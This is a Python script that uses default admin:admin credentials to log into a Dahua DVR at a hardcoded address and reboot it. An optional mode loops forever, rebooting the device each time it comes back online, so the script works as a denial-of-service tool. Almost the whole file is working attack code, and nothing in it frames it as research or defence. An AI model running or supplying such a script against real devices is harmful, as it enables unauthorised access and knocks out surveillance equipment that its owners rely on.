#!/usr/bin/env python3
#https://gist.github.com/gxfxyz/48072a72be3a169bc43549e676713201#file-dahua_rpc-py
import itertools
import threading
import requests
import time
import sys
from dahua_rpc import DahuaRpc, RebootDone

host = "192.168.100.208"
username = "admin"
password = "admin"
done = False

def singleReboot():
    dahua = DahuaRpc(host, username, password)
    print(f"Attempting to log into {host} with {username}:{password}")
    dahua.login()
    print(f"Correctly logged in at {dahua.current_time()}")

    print("Rebooting...")
    try:
        dahua.reboot()
    except RebootDone:
        print("DVR likely reboted!")

def DOS_reboot():
    while True:
        try:
            #Login to the DVR
            dahua = DahuaRpc(host, username, password)
            print(f"Attempting to log into {host} with {username}:{password}")
            dahua.login()
            print(f"Correctly logged in at {dahua.current_time()}")

            print("Rebooting...")
            try:
                dahua.reboot()
            except RebootDone:
                print("DVR likely rebooted!")
                time.sleep(10)
                DOS_reboot()  # Continue the reboot cycle
                break
            except Exception as e:
                print(f"Unexpected error 1: {e}")
                time.sleep(0.5)
        except requests.exceptions.ConnectionError:
            print("Connection failed, retrying in 0.5 seconds...")
            time.sleep(0.5)
        except Exception as e:
            print(f"Unexpected error 2: {e}")
            time.sleep(0.5)

def waitAnimation():
    #here is the animation
    for c in itertools.cycle([" [=     ]",
                                " [ =    ]",
                                " [  =   ]",
                                " [   =  ]",
                                " [    = ]",
                                " [     =]",
                                " [    = ]",
                                " [   =  ]",
                                " [  =   ]",
                                " [ =    ]",]):
        if done:
            break
        sys.stdout.write('\r' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')

def main():
    done = False
    
    DOS = input("Do you want to keep rebooting the device? (y/n) ").lower()

    if DOS == 'y':
        DOS_reboot()
    elif DOS == 'n':
        singleReboot()
        print("Goodbye")

    print("Goodbye")

if __name__ == "__main__":
    main()